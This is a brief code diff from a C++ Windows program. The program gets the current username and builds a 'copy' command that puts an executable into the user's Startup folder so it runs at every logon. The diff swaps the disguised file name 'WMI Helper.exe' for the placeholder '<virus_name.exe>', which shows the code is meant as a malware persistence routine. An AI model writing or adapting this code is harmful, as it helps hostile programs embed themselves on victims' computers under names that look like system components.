@@ -12,7 +12,7 @@ int main() {
 	DWORD username_len = UNLEN + 1;
 	GetUserNameA(username, &username_len);
 
-	string file_name = "WMI Helper.exe";
+	string file_name = "<virus_name.exe>";//<-------------------------
 
 	cout << username;
 	string const put = "copy \"" + file_name + "\"  \"C:\\Users\\" + string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
